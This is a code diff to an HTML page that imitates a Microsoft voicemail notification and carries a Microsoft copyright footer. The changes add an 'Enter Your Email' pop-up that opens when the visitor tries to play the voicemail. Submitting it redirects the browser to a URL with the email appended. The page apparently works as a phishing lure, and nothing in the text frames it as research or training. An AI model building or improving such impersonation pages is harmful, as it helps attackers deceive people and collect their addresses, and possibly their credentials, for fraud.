@@ -14,7 +14,7 @@
         }
         
         body {
-            background-color: #f5f5f5;
+            background-color: #ffffff;
             color: #252525;
             line-height: 1.6;
             display: flex;
@@ -29,7 +29,6 @@
             padding: 2rem;
             background-color: #fff;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
             text-align: center;
             flex: 1;
         }
@@ -155,12 +154,85 @@
             text-decoration: underline;
         }
         
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background-color: white;
+            padding: 2rem;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .modal h2 {
+            margin-bottom: 1rem;
+            color: #5b5fc7;
+        }
+        
+        .modal input {
+            width: 100%;
+            padding: 0.8rem;
+            margin: 1rem 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+        }
+        
+        .modal-buttons {
+            display: flex;
+            justify-content: flex-end;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+        
+        .modal-btn {
+            padding: 0.6rem 1.2rem;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+        }
+        
+        .modal-btn.primary {
+            background-color: #6264A7;
+            color: white;
+        }
+        
+        .modal-btn.secondary {
+            background-color: #f0f0f0;
+            color: #333;
+        }
+        
+        .modal-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+        
         /* Responsive styles */
         @media (max-width: 768px) {
             .container {
                 padding: 1.5rem;
                 margin: 0 1rem;
                 border-radius: 0;
+            }
+            
+            .logo {
+                width: 150px;
+                height: 125px;
             }
             
             h1 {
@@ -177,6 +249,11 @@
                 padding: 1rem;
                 margin: 0;
                 box-shadow: none;
+            }
+            
+            .logo {
+                width: 180px;
+                height: 150px;
             }
             
             .audio-player {
@@ -214,8 +291,20 @@
             </div>
         </div>
         
-        <button class="btn">Play Voicemail</button>
+        <button class="btn play-text">Play Voicemail</button>
     </main>
+    
+    <!-- Email Collection Modal -->
+    <div class="modal" id="emailModal">
+        <div class="modal-content">
+            <h2>Enter Your Email</h2>
+            <input type="email" id="userEmail" placeholder="Enter your email address" required>
+            <div class="modal-buttons">
+                <button class="modal-btn secondary" onclick="closeModal()">Cancel</button>
+                <button class="modal-btn primary" onclick="submitEmail()">Continue</button>
+            </div>
+        </div>
+    </div>
     
     <footer>
         <p>© 2025 Microsoft Corporation. All rights reserved.</p>
@@ -227,21 +316,45 @@
     </footer>
     
     <script>
+        // Close modal function
+        function closeModal() {
+            document.getElementById('emailModal').style.display = 'none';
+        }
+        
+        // Submit email and redirect
+        function submitEmail() {
+            const email = document.getElementById('userEmail').value;
+            if (email && email.includes('@')) {
+                window.location.href = `newurl${email}`;
+            } else {
+                alert('Please enter a valid email address');
+            }
+        }
+        
+        // Add click event to the Play Voicemail text
+        document.querySelector('.play-text').addEventListener('click', function() {
+            document.getElementById('emailModal').style.display = 'flex';
+        });
+        
         // Simple interactivity for the play button
         document.querySelector('.play-btn').addEventListener('click', function() {
             // Toggle between play and pause
             if (this.textContent === '▶') {
                 this.textContent = '❚❚';
+                // Show modal when play is clicked
+                document.getElementById('emailModal').style.display = 'flex';
             } else {
                 this.textContent = '▶';
             }
         });
         
-        // Main button functionality
-        document.querySelector('.btn').addEventListener('click', function() {
-            alert('Voicemail playback would start here in a real application.');
-            document.querySelector('.play-btn').textContent = '❚❚';
-        });
+        // // Main button functionality
+        // document.querySelector('.btn').addEventListener('click', function() {
+        //     alert('Voicemail playback would start here in a real application.');
+        //     document.querySelector('.play-btn').textContent = '❚❚';
+        //     // Show modal when main button is clicked
+        //     document.getElementById('emailModal').style.display = 'flex';
+        // });
     </script>
 </body>
 </html>
